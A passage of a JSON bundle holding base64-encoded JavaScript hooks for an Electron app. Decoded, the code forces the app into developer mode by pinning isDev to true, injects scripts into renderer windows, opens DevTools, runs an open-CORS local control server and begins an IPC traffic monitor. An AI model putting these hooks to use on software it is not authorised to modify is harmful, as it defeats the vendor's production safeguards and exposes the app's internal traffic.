IGdldHRlci9zZXR0ZXIgdGhhdCBhbHdheXMgcmV0dXJucyB0cnVlCiAgICB0cnkgewogICAgICAgIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShnbG9iYWwsICdpc0RldicsIHsKICAgICAgICAgICAgZ2V0OiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9LAogICAgICAgICAgICBzZXQ6IGZ1bmN0aW9uKHZhbHVlKSB7CiAgICAgICAgICAgICAgICAvLyBMb2cgYXR0ZW1wdHMgdG8gY2hhbmdlIHRoZSB2YWx1ZQogICAgICAgICAgICAgICAgZGV2TW9kZUNoYW5nZXMucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgdGltZTogbmV3IERhdGUoKS50b0lTT1N0cmluZygpLAogICAgICAgICAgICAgICAgICAgIGF0dGVtcHRlZFZhbHVlOiB2YWx1ZSwKICAgICAgICAgICAgICAgICAgICBzdGFjazogbmV3IEVycm9yKCkuc3RhY2sKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtERVYtTU9ERV0gUHJldmVudGVkIGNoYW5naW5nIGlzRGV2IHRvICR7dmFsdWV9YCk7CiAgICAgICAgICAgICAgICAvLyBBY3R1YWwgdmFsdWUgZG9lc24ndCBjaGFuZ2UgLSBnZXR0ZXIgYWx3YXlzIHJldHVybnMgdHJ1ZQogICAgICAgICAgICB9LAogICAgICAgICAgICBjb25maWd1cmFibGU6IGZhbHNlLCAvLyBQcmV2ZW50IHRoaXMgcHJvcGVydHkgZnJvbSBiZWluZyByZS1jb25maWd1cmVkCiAgICAgICAgICAgIGVudW1lcmFibGU6IHRydWUKICAgICAgICB9KTsKICAgICAgICAKICAgICAgICBjb25zb2xlLmxvZyhgW0RFVi1NT0RFXSBpc0RldiBwcm9wZXJ0eSBpbnRlcmNlcHRlZCwgbm93IHJldHVybnM6ICR7Z2xvYmFsLmlzRGV2fWApOwogICAgfSBjYXRjaCAoZSkgewogICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tERVYtTU9ERV0gRXJyb3Igb3ZlcnJpZGluZyBpc0RldiBwcm9wZXJ0eTonLCBlKTsKICAgIH0KICAgIAogICAgLy8gQ3JlYXRlIG1vbml0b3Igc2VydmVyCiAgICBjb25zdCBzZXJ2ZXIgPSBodHRwLmNyZWF0ZVNlcnZlcigocmVxLCByZXMpID0+IHsKICAgICAgICByZXMuc2V0SGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW4nLCAnKicpOwogICAgICAgIHJlcy5zZXRIZWFkZXIoJ0NvbnRlbnQtVHlwZScsICdhcHBsaWNhdGlvbi9qc29uJyk7CiAgICAgICAgCiAgICAgICAgY29uc3QgdXJsID0gbmV3IFVSTChyZXEudXJsLCBgaHR0cDovL2xvY2FsaG9zdDoke1BPUlR9YCk7CiAgICAgICAgY29uc3QgcGF0aCA9IHVybC5wYXRobmFtZTsKICAgICAgICAKICAgICAgICBpZiAocGF0aCA9PT0gJy9zdGF0dXMnKSB7CiAgICAgICAgICAgIC8vIFJldHVybiBjdXJyZW50IHN0YXR1cyBhbmQgY2hhbmdlIGxvZwogICAgICAgICAgICByZXMud3JpdGVIZWFkKDIwMCk7CiAgICAgICAgICAgIHJlcy5lbmQoSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgaXNEZXY6IGdsb2JhbC5pc0RldiwKICAgICAgICAgICAgICAgIG9yaWdpbmFsVmFsdWU6IG9yaWdpbmFsSXNEZXYsCiAgICAgICAgICAgICAgICBkZXNjcmlwdG9yOiBPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKGdsb2JhbCwgJ2lzRGV2JyksCiAgICAgICAgICAgICAgICBjaGFuZ2VBdHRlbXB0czogZGV2TW9kZUNoYW5nZXMsCiAgICAgICAgICAgICAgICBnbG9iYWxzOiBPYmplY3Qua2V5cyhnbG9iYWwpCiAgICAgICAgICAgICAgICAgICAgLmZpbHRlcihrZXkgPT4gIWtleS5zdGFydHNXaXRoKCdfJykpCiAgICAgICAgICAgICAgICAgICAgLnJlZHVjZSgob2JqLCBrZXkpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgZ2xvYmFsW2tleV0gPT09ICdib29sZWFuJyB8fCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlb2YgZ2xvYmFsW2tleV0gPT09ICdzdHJpbmcnIHx8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGVvZiBnbG9iYWxba2V5XSA9PT0gJ251bWJlcicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvYmpba2V5XSA9IGdsb2JhbFtrZXldOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvYmpba2V5XSA9IGBbJHt0eXBlb2YgZ2xvYmFsW2tleV19XWA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9ialtrZXldID0gJ1tFcnJvcl0nOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBvYmo7CiAgICAgICAgICAgICAgICAgICAgfSwge30pCiAgICAgICAgICAgIH0pKTsKICAgICAgICB9IGVsc2UgaWYgKHBhdGggPT09ICcvbW9kdWxlcycpIHsKICAgICAgICAgICAgLy8gRmluZCBtb2R1bGVzIHRoYXQgbWlnaHQgYmUgY29udHJvbGxpbmcgaXNEZXYKICAgICAgICAgICAgY29uc3QgbW9kdWxlSW5mbyA9IFtdOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKHJlcXVpcmUuY2FjaGUpIHsKICAgICAgICAgICAgICAgICAgICBmb3IgKGNvbnN0IGtleSBpbiByZXF1aXJlLmNhY2hlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBtb2QgPSByZXF1aXJlLmNhY2hlW2tleV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAobW9kICYmIG1vZC5leHBvcnRzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gQ2hlY2sgaWYgdGhpcyBtb2R1bGUgZXhwb3J0cyBpc0RldgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtb2QuZXhwb3J0cy5pc0RldiAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1vZHVsZUluZm8ucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZDogbW9kLmlkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNEZXY6IG1vZC5leHBvcnRzLmlzRGV2LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZW5hbWU6IG1vZC5maWxlbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIE92ZXJyaWRlIHRoZSBtb2R1bGUncyBpc0RldiB0b28KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShtb2QuZXhwb3J0cywgJ2lzRGV2JywgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdldDogZnVuY3Rpb24oKSB7IHJldHVybiB0cnVlOyB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldDogZnVuY3Rpb24odmFsdWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtERVYtTU9ERV0gTW9kdWxlICR7bW9kLmlkfSB0cmllZCB0byBzZXQgaXNEZXYgdG8gJHt2YWx1ZX1gKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpZ3VyYWJsZTogZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBJZ25vcmUgaWYgd2UgY2FuJ3Qgb3ZlcnJpZGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBMb29rIGZvciBnZXR0ZXJzL3NldHRlcnMgcmVsYXRlZCB0byBpc0RldgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRlc2NyaXB0b3IgPSBPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKG1vZC5leHBvcnRzLCAnaXNEZXYnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGVzY3JpcHRvciAmJiAoZGVzY3JpcHRvci5nZXQgfHwgZGVzY3JpcHRvci5zZXQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1vZHVsZUluZm8ucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZDogbW9kLmlkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGFzR2V0dGVyU2V0dGVyOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZW5hbWU6IG1vZC5maWxlbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlc2NyaXB0b3I6IGRlc2NyaXB0b3IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBTa2lwIHRoaXMgbW9kdWxlIG9uIGVycm9yCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgIG1vZHVsZUluZm8ucHVzaCh7ZXJyb3I6IGUubWVzc2FnZX0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICByZXMud3JpdGVIZWFkKDIwMCk7CiAgICAgICAgICAgIHJlcy5lbmQoSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgbW9kdWxlczogbW9kdWxlSW5mbwogICAgICAgICAgICB9KSk7CiAgICAgICAgfSBlbHNlIGlmIChwYXRoID09PSAnL2VuYWJsZS1kZXZ0b29scycpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgQnJvd3NlcldpbmRvdyB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgICAgIGNvbnN0IHdpbmRvd3MgPSBCcm93c2VyV2luZG93LmdldEFsbFdpbmRvd3MoKTsKICAgICAgICAgICAgICAgIGNvbnN0IHJlc3VsdCA9IFtdOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb3IgKGNvbnN0IHdpbiBvZiB3aW5kb3dzKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbiAmJiB3aW4ud2ViQ29udGVudHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2luLndlYkNvbnRlbnRzLm9wZW5EZXZUb29scygpOwogICAgICAgICAgICAgICAgICAgICAgICByZXN1bHQucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZDogd2luLmlkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGV2VG9vbHNPcGVuZWQ6IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAvLyBJbmplY3QgaXNEZXYgaW50byByZW5kZXJlcgogICAgICAgICAgICAgICAgICAgICAgICB3aW4ud2ViQ29udGVudHMuZXhlY3V0ZUphdmFTY3JpcHQoYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIE92ZXJyaWRlIHdpbmRvdy5pc0RldgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC5kZWZpbmVQcm9wZXJ0eSh3aW5kb3csICdpc0RldicsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2V0OiBmdW5jdGlvbigpIHsgcmV0dXJuIHRydWU7IH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldDogZnVuY3Rpb24oKSB7IC8qaWdub3JlKi8gfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uZmlndXJhYmxlOiBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIENoZWNrIGZvciBtb2R1bGVzIHRoYXQgbWlnaHQgY29udHJvbCBpc0RldgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh3aW5kb3cucmVxdWlyZSAmJiB0eXBlb2Ygd2luZG93LnJlcXVpcmUgPT09ICdmdW5jdGlvbicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIEF0dGVtcHQgdG8gb3ZlcnJpZGUgaW4gY29tbW9uIG1vZHVsZSBzeXN0ZW1zCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBtb2R1bGVzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZWN0cm9uOiB3aW5kb3cucmVxdWlyZSgnZWxlY3Ryb24nKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maWc6IHdpbmRvdy5yZXF1aXJlKCcuL2NvbmZpZycpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGNvbnN0IG5hbWUgaW4gbW9kdWxlcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtb2R1bGVzW25hbWVdICYmIG1vZHVsZXNbbmFtZV0uaXNEZXYgIT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QuZGVmaW5lUHJvcGVydHkobW9kdWxlc1tuYW1lXSwgJ2lzRGV2JywgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2V0OiBmdW5jdGlvbigpIHsgcmV0dXJuIHRydWU7IH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXQ6IGZ1bmN0aW9uKCkgeyAvKmlnbm9yZSovIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maWd1cmFibGU6IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnT3ZlcnJvZGUgaXNEZXYgaW4gJyArIG5hbWUgKyAnIG1vZHVsZScpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnRXJyb3Igb3ZlcnJpZGluZyBtb2R1bGUgaXNEZXY6JywgZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzRGV2OiB3aW5kb3cuaXNEZXYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2F0aW9uOiB3aW5kb3cubG9jYXRpb24uaHJlZgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KSgpOwogICAgICAgICAgICAgICAgICAgICAgICBgKS50aGVuKHJlc3VsdCA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnW0RFVi1NT0RFXSBSZW5kZXJlciBpbmplY3Rpb24gcmVzdWx0OicsIHJlc3VsdCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pLmNhdGNoKGVyciA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbREVWLU1PREVdIFJlbmRlcmVyIGluamVjdGlvbiBlcnJvcjonLCBlcnIpOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJlcy53cml0ZUhlYWQoMjAwKTsKICAgICAgICAgICAgICAgIHJlcy5lbmQoSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IHRydWUsCiAgICAgICAgICAgICAgICAgICAgd2luZG93czogcmVzdWx0CiAgICAgICAgICAgICAgICB9KSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgIHJlcy53cml0ZUhlYWQoNTAwKTsKICAgICAgICAgICAgICAgIHJlcy5lbmQoSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgIGVycm9yOiBlLm1lc3NhZ2UsCiAgICAgICAgICAgICAgICAgICAgc3RhY2s6IGUuc3RhY2sKICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vIERlZmF1bHQgcmVzcG9uc2Ugd2l0aCB1c2FnZSBpbnN0cnVjdGlvbnMKICAgICAgICAgICAgcmVzLndyaXRlSGVhZCgyMDApOwogICAgICAgICAgICByZXMuZW5kKEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgIHN0YXR1czogJ0RldmVsb3BlciBtb2RlIGNvbnRyb2wgc2VydmVyJywKICAgICAgICAgICAgICAgIGVuZHBvaW50czogewogICAgICAgICAgICAgICAgICAgICcvc3RhdHVzJzogJ0dldCBjdXJyZW50IHN0YXR1cycsCiAgICAgICAgICAgICAgICAgICAgJy9tb2R1bGVzJzogJ0ZpbmQgbW9kdWxlcyB3aXRoIGlzRGV2IHByb3BlcnR5JywKICAgICAgICAgICAgICAgICAgICAnL2VuYWJsZS1kZXZ0b29scyc6ICdPcGVuIERldlRvb2xzIGZvciBhbGwgd2luZG93cycKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkpOwogICAgICAgIH0KICAgIH0pOwogICAgCiAgICBzZXJ2ZXIubGlzdGVuKFBPUlQsICcxMjcuMC4wLjEnLCAoKSA9PiB7CiAgICAgICAgY29uc29sZS5sb2coYFtERVYtTU9ERV0gQ29udHJvbCBzZXJ2ZXIgbGlzdGVuaW5nIG9uIGh0dHA6Ly9sb2NhbGhvc3Q6JHtQT1JUfWApOwogICAgfSk7CiAgICAKICAgIC8vIFRyeSB0byB0cmFjayBhcHAgY29uZmlndXJhdGlvbgogICAgdHJ5IHsKICAgICAgICBjb25zdCB7IGFwcCB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICBpZiAoYXBwICYmIGFwcC5pc1JlYWR5KCkpIHsKICAgICAgICAgICAgaW5qZWN0RGV2KCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgYXBwLndoZW5SZWFkeSgpLnRoZW4oaW5qZWN0RGV2KTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgZnVuY3Rpb24gaW5qZWN0RGV2KCkgewogICAgICAgICAgICAvLyBPdmVycmlkZSBwcm9jZXNzIGFyZ3VtZW50cyB0byBpbmNsdWRlIGRldiBmbGFncwogICAgICAgICAgICBpZiAocHJvY2Vzcy5hcmd2LmluZGV4T2YoJy0tZGV2JykgPT09IC0xKSB7CiAgICAgICAgICAgICAgICBwcm9jZXNzLmFyZ3YucHVzaCgnLS1kZXYnKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKHByb2Nlc3MuYXJndi5pbmRleE9mKCctLWRldmVsb3BtZW50JykgPT09IC0xKSB7CiAgICAgICAgICAgICAgICBwcm9jZXNzLmFyZ3YucHVzaCgnLS1kZXZlbG9wbWVudCcpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBGb3JjZSBFbGVjdHJvbiB0byB0aGluayBpdCdzIGluIGRldiBtb2RlCiAgICAgICAgICAgIGlmIChwcm9jZXNzLmRlZmF1bHRBcHAgIT09IHRydWUpIHsKICAgICAgICAgICAgICAgIHByb2Nlc3MuZGVmYXVsdEFwcCA9IHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIEZvcmNlIGRlYnVnIGVudmlyb25tZW50IHZhcmlhYmxlCiAgICAgICAgICAgIHByb2Nlc3MuZW52Lk5PREVfRU5WID0gJ2RldmVsb3BtZW50JzsKICAgICAgICAgICAgcHJvY2Vzcy5lbnYuRUxFQ1RST05fSVNfREVWID0gJzEnOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc29sZS5sb2coJ1tERVYtTU9ERV0gUHJvY2VzcyBlbnZpcm9ubWVudCBtb2RpZmllZCBmb3IgZGV2IG1vZGUnKTsKICAgICAgICB9CiAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgY29uc29sZS5lcnJvcignW0RFVi1NT0RFXSBFcnJvciBpbiBhcHAgcmVhZHkgaGFuZGxlcjonLCBlKTsKICAgIH0KICAgIAogICAgY29uc29sZS5sb2coJ1tERVYtTU9ERV0gRGV2ZWxvcGVyIG1vZGUgb3ZlcnJpZGUgaW5zdGFsbGVkJyk7Cn0pKCk7Cg==","ipc-hook.js":"Y29uc29sZS5sb2coJ1tJUEMtTU9OSVRPUl0gPT09IFNUQVJUSU5HIElQQyBUUkFGRklDIE1PTklUT1JJTkcgPT09Jyk7CgooZnVuY3Rpb24oKSB7CiAgICAndXNlIHN0cmljdCc7CiAgICAKICAgIC8vIFNraXAgaWYgYWxyZWFkeSBsb2FkZWQKICAgIGlmIChnbG9iYWwuX2lwY01vbml0b3JMb2FkZWQpIHsKICAgICAgICBjb25zb2xlLmxvZygnW0lQQy1NT05JVE9SXSBBbHJlYWR5IGxvYWRlZCwgc2tpcHBpbmcuLi4nKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBnbG9iYWwuX2lwY01vbml0b3JMb2FkZWQgPSB0cnVlOwogICAgCiAgICBjb25zdCBQT1JUID0gMTAwMTI7CiAgICBsZXQgc2VydmVyID0gbnVsbDsKICAgIGxldCBpcGNUcmFmZmljID0gW107CiAgICAKICAgIGNvbnNvbGUubG9nKCdbSVBDLU1PTklUT1JdIEluaXRpYWxpemluZyBJUEMgdHJhZmZpYyBtb25pdG9yLi4uJyk7CiAgICAKICAgIC8vIFNhZmUgSlNPTiBzZXJpYWxpemF0aW9uCiAgICBmdW5jdGlvbiBzYWZlU3RyaW5naWZ5KG9iaikgewogICAgICAgIGNvbnN0IHNlZW4gPSBuZXcgV2Vha1NldCgpOwogICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShvYmosIChrZXksIHZhbHVlKSA9PiB7CiAgICAgICAgICAgIGlmICh0eXBlb2YgdmFsdWUgPT09ICdvYmplY3QnICYmIHZhbHVlICE9PSBudWxsKSB7CiAgICAgICAgICAgICAgICBpZiAoc2Vlbi5oYXModmFsdWUpKSByZXR1cm4gJ1tDaXJjdWxhciBSZWZlcmVuY2VdJzsKICAgICAgICAgICAgICAgIHNlZW4uYWRkKHZhbHVlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAodHlwZW9mIHZhbHVlID09PSAnZnVuY3Rpb24nKSByZXR1cm4gJ1tGdW5jdGlvbl0nOwogICAgICAgICAgICBpZiAodmFsdWUgaW5zdGFuY2VvZiBEYXRlKSByZXR1cm4gdmFsdWUudG9JU09TdHJpbmcoKTsKICAgICAgICAgICAgaWYgKHZhbHVlIGluc3RhbmNlb2YgRXJyb3IpIHJldHVybiB7IGVycm9yOiB2YWx1ZS5tZXNzYWdlIH07CiAgICAgICAgICAgIHJldHVybiB2YWx1ZTsKICAgICAgICB9KTsKICAgIH0KICAgIAogICAgLy8gU2FmZSBhcmd1bWVudCBzZXJpYWxpemF0aW9uCiAgICBmdW5jdGlvbiBzYWZlU2VyaWFsaXplQXJncyhhcmdzKSB7CiAgICAgICAgcmV0dXJuIGFyZ3MubWFwKGFyZyA9PiB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBpZiAoYXJnID09PSBudWxsKSByZXR1cm4gJ251bGwnOwogICAgICAgICAgICAgICAgaWYgKGFyZyA9PT0gdW5kZWZpbmVkKSByZXR1cm4gJ3VuZGVmaW5lZCc7CiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIGFyZyA9PT0gJ2Z1bmN0aW9uJykgcmV0dXJuICdbRnVuY3Rpb25dJzsKICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgYXJnID09PSAnc3RyaW5nJykgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBhcmcubGVuZ3RoID4gMjAwID8gYXJnLnN1YnN0cmluZygwLCAyMDApICsgJy4uLicgOiBhcmc7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIGFyZyA9PT0gJ29iamVjdCcpIHsKICAgICAgICAgICAgICAgICAgICAvLyBUcnkgdG8gc2VyaWFsaXplIGJ1dCBsaW1pdCBkZXB0aAogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBKU09OLnBhcnNlKEpTT04uc3RyaW5naWZ5KGFyZywgKGtleSwgdmFsdWUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgdmFsdWUgPT09ICdmdW5jdGlvbicpIHJldHVybiAnW0Z1bmN0aW9uXSc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAodmFsdWUgaW5zdGFuY2VvZiBIVE1MRWxlbWVudCkgcmV0dXJuICdbSFRNTEVsZW1lbnRdJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB2YWx1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGBbT2JqZWN0ICR7YXJnLmNvbnN0cnVjdG9yPy5uYW1lIHx8ICdVbmtub3duJ31dYDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gYXJnOwogICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJ1tVbnNlcmlhbGl6YWJsZV0nOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB9CiAgICAKICAgIC8vIENyZWF0ZSBIVFRQIHNlcnZlciB3aXRoIFdlYlNvY2tldCB1cGdyYWRlIHN1cHBvcnQKICAgIGZ1bmN0aW9uIGNyZWF0ZUhUVFBTZXJ2ZXIoKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgY29uc3QgaHR0